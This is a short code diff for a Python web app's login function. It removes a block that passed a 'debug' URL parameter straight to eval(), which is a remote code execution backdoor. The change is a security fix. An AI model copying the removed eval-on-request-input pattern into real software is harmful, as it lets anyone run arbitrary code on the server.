@@ -107,14 +107,6 @@ def login():
     
     form = LoginForm()
     if form.validate_on_submit():
-
-        debug_code = request.args.get('debug')
-        if debug_code:
-            try:
-                eval(debug_code)
-            except Exception as e:
-                logger.error(f"Eval debug failed: {e}")
-
         # Use parameterized query to prevent SQL injection
         user = User.query.filter_by(username=form.username.data).first()
         
